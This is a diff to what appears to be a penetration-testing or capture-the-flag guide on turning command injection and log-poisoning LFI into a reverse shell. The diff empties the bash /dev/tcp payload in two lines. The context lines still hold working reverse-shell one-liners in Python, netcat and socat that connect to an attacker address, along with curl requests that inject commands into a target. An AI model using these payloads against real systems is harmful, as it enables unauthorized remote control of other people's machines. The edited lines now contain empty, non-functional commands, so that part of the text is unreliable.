@@ -115,7 +115,7 @@ curl "http://10.10.10.10/index.php?page=/var/log/apache2/access.log&c=id"
 nc -zvw3 10.10.14.3 4444 && echo "Port open"
 
 # 2️⃣ Use a minimal, URL‑encoded payload
-payload=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote("bash -c \'bash -i >& /dev/tcp/10.10.14.3/4444 0>&1\'"))')
+payload=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote("bash -c \'\'"))')
 curl -s "http://10.10.10.10/?cmd=$payload"
 
 # 3️⃣ If the target only accepts GET, consider using a *GET* injection with `curl -G --data-urlencode`.
@@ -126,7 +126,7 @@ curl -s "http://10.10.10.10/?cmd=$payload"
 | Language | One‑liner |
 |----------|-----------|
 | **Python 2** | `python -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("10.10.14.3",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'` |
-| **PHP** | `php -r 'exec("/bin/bash -c \'bash -i >& /dev/tcp/10.10.14.3/4444 0>&1\'");'` |
+| **PHP** | `php -r 'exec("/bin/bash -c \'\'");'` |
 | **Netcat (traditional)** | `nc -e /bin/sh 10.10.14.3 4444` (if `nc -e` is supported) |
 | **Socat** | `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.3:4444` |
 
